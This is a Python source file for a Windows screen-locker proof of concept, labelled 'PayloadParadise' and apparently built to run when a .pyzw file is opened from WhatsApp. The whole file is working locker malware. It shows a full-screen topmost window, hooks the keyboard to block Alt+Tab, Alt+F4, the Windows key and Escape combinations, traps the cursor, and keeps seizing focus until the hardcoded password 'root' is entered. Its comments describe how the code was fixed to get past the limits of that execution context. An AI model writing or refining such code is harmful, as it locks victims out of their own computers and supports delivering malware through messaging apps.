import ctypes
import ctypes.wintypes
import threading
import os
from tkinter import Tk, Entry, Label, StringVar, Frame

# ============================================================
# Screen Locker POC - PayloadParadise
# Uses ctypes Win32 API instead of pyautogui to work
# in the WhatsApp .pyzw execution context.
#
# Root cause of original failure:
#   - pyautogui requires pip install and uses accessibility
#     APIs that are blocked in the .pyzw sandbox
#   - winfo_screenmmwidth() returns millimeters, not pixels (bug)
#   - Busy-loop calling on_closing() without mainloop() breaks tkinter
#
# This rewrite uses:
#   - ctypes for mouse confinement (ClipCursor) and cursor control
#   - Proper tkinter mainloop with event-driven architecture
#   - Win32 API to disable task switching (Alt+Tab, Win key)
#
# FOR EDUCATIONAL PURPOSES ONLY.
# ============================================================

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# --- Win32 constants ---
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
HC_ACTION = 0
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_F4 = 0x73

LRESULT = ctypes.c_long
ULONG_PTR = ctypes.POINTER(ctypes.c_ulong)
HOOKPROC = ctypes.WINFUNCTYPE(
    LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM
)


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]


# Password to unlock
UNLOCK_PASSWORD = "root"

# Global flag
unlocked = False


def block_keys_callback(nCode, wParam, lParam):
    """Block Alt+Tab, Alt+F4, Win key, and Ctrl+Esc to prevent escape."""
    if nCode == HC_ACTION:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode

        # Get modifier states
        alt_pressed = (user32.GetAsyncKeyState(0x12) & 0x8000) != 0
        ctrl_pressed = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0

        # Block Alt+Tab
        if alt_pressed and vk == VK_TAB:
            return 1
        # Block Alt+F4
        if alt_pressed and vk == VK_F4:
            return 1
        # Block Win key
        if vk in (VK_LWIN, VK_RWIN):
            return 1
        # Block Ctrl+Esc (Start menu)
        if ctrl_pressed and vk == VK_ESCAPE:
            return 1
        # Block Alt+Esc
        if alt_pressed and vk == VK_ESCAPE:
            return 1

    return user32.CallNextHookEx(None, nCode, wParam, lParam)


# Must keep a reference to prevent garbage collection
_block_callback = HOOKPROC(block_keys_callback)


def install_keyboard_block():
    """Install low-level keyboard hook to block escape combos.
    Runs its own message pump on a background thread."""
    hook = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        _block_callback,
        kernel32.GetModuleHandleW(None),
        0,
    )
    if not hook:
        return

    msg = ctypes.wintypes.MSG()
    while not unlocked:
        # PeekMessage with PM_REMOVE so we don't block forever
        if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        else:
            ctypes.windll.kernel32.Sleep(10)

    user32.UnhookWindowsHookEx(hook)


def confine_cursor(width, height):
    """Continuously confine the cursor to the center region of the screen."""
    # Define a small rectangle in the center for the cursor to be trapped in
    cx, cy = width // 2, height // 2
    margin = 200  # Allow some movement around the entry field

    class RECT(ctypes.Structure):
        _fields_ = [
            ("left", ctypes.c_long),
            ("top", ctypes.c_long),
            ("right", ctypes.c_long),
            ("bottom", ctypes.c_long),
        ]

    rect = RECT(cx - margin, cy - margin, cx + margin, cy + margin)

    while not unlocked:
        user32.ClipCursor(ctypes.byref(rect))
        ctypes.windll.kernel32.Sleep(100)

    # Release cursor confinement when unlocked
    user32.ClipCursor(None)


def create_locker():
    """Create the full-screen locker GUI."""
    global unlocked

    root = Tk()
    root.title("")

    # Get actual screen dimensions (pixels, not mm)
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()

    # Full-screen, always on top, no decorations
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="#1a1a2e")
    root.overrideredirect(True)  # Remove title bar

    # Prevent closing via WM_DELETE_WINDOW
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # --- Center frame ---
    frame = Frame(root, bg="#16213e", padx=40, pady=40)
    frame.place(relx=0.5, rely=0.5, anchor="center")

    # Lock icon / title
    lock_label = Label(
        frame,
        text="🔒 SYSTEM LOCKED",
        font=("Segoe UI", 28, "bold"),
        fg="#e94560",
        bg="#16213e",
    )
    lock_label.pack(pady=(0, 20))

    # Instruction
    instruction = Label(
        frame,
        text="Enter the password to unlock:",
        font=("Segoe UI", 14),
        fg="#a8a8b3",
        bg="#16213e",
    )
    instruction.pack(pady=(0, 10))

    # Password entry
    password_var = StringVar()
    entry = Entry(
        frame,
        textvariable=password_var,
        font=("Consolas", 16),
        show="●",
        width=25,
        bg="#0f3460",
        fg="#ffffff",
        insertbackground="#e94560",
        relief="flat",
        justify="center",
    )
    entry.pack(pady=(0, 15), ipady=8)
    entry.focus_force()

    # Status label
    status_var = StringVar(value="")
    status_label = Label(
        frame,
        textvariable=status_var,
        font=("Segoe UI", 11),
        fg="#e94560",
        bg="#16213e",
    )
    status_label.pack()

    def check_password(event=None):
        global unlocked
        if password_var.get() == UNLOCK_PASSWORD:
            unlocked = True
            user32.ClipCursor(None)  # Release cursor immediately
            root.destroy()
        else:
            status_var.set("❌ Incorrect password. Try again.")
            password_var.set("")
            entry.focus_force()

    # Bind Enter key to password check
    entry.bind("<Return>", check_password)

    # Periodically re-focus and re-raise the window
    def enforce_focus():
        if not unlocked:
            root.attributes("-topmost", True)
            root.focus_force()
            entry.focus_force()
            root.lift()
            root.after(500, enforce_focus)

    enforce_focus()

    # Start keyboard blocker on a separate thread
    kb_thread = threading.Thread(target=install_keyboard_block, daemon=True)
    kb_thread.start()

    # Start cursor confinement on a separate thread
    cursor_thread = threading.Thread(
        target=confine_cursor, args=(width, height), daemon=True
    )
    cursor_thread.start()

    # Run tkinter mainloop (proper event-driven loop, not busy-wait)
    root.mainloop()


if __name__ == "__main__":
    create_locker()
